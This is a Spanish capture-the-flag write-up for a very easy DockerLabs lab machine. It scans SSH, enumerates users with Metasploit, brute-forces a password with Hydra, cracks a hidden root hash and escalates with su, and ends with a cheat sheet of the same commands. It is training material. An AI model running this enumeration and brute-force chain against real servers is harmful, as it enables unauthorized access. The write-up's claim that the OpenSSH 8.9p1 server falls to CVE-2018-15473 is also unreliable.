# DockerLabs - BreakMySSH

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Metasploit (ssh_enumusers), SSH brute-forcing, crackeo de hash, escalada de privilegios (su)
- **Tiempo:** ~20 minutos
- **Fecha:** 2026-04-12

## Info
| | |
|---|---|
| IP | 172.17.0.2 |
| OS | Ubuntu (Docker) |
| Servicios | 22/tcp (SSH) |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- 172.17.0.2 -oN targeted
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 |

---

## Enumeración

### Enumeración de usuarios SSH (Metasploit)

El servidor SSH es vulnerable a la enumeración de usuarios. Usamos Metasploit:

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 172.17.0.2
set USER_FILE /usr/share/wordlists/rockyou.txt
set CHECK_FALSE true
run
```

**Usuario encontrado:** `lovely`

---

## Explotación

### SSH Brute-forcing con Hydra

Con el usuario `lovely` encontrado, usamos hydra para crackear la contraseña:

```bash
hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

**Credenciales encontradas:**
- Usuario: `lovely`
- Contraseña: `rockyou`

### Acceso SSH

```bash
ssh lovely@172.17.0.2
password: rockyou
```

---

## Escalada de privilegios

### Encontrando el hash

Una vez dentro, exploramos el sistema y encontramos un archivo oculto:

```bash
ls -la /opt/
cat /opt/.hash
```

El archivo contiene un hash que parece ser de root.

### Crackeo del hash

Usamos CrackStation para crackear el hash:

```
Hash crackeado: estrella
```

### Obtención de shell root

```bash
su root
password: estrella
whoami
# root
```

¡Somos root!

---

## Flag

No hay flag en esta máquina — el objetivo es obtener acceso root.

---

## Lecciones aprendidas

1. **CVE-2018-15473**: Esta vulnerabilidad es muy útil para enumerar usuarios en servidores SSH antiguos
2. **Wordlists**: rockyou.txt sigue siendo efectiva para máquinas de CTF
3. **Archivos ocultos**: siempre buscar en `/opt/` y otros directorios menos evidentes
4. **Hashes**: los hashes de sistemas Linux pueden crackearse fácilmente con herramientas online

---

## Comandos útiles

```bash
# Reconocimiento
nmap -sCV -p- 172.17.0.2 -oN targeted

# Enumeración de usuarios (CVE-2018-15473)
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 172.17.0.2
set USER_FILE /usr/share/wordlists/rockyou.txt
set CHECK_FALSE true
run

# Brute-force
hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

# Acceso
ssh lovely@172.17.0.2

# Inside
ls -la /opt/
cat /opt/.hash

# Crackear hash: usar crackstation.net

# Escalada
su root
password: estrella
```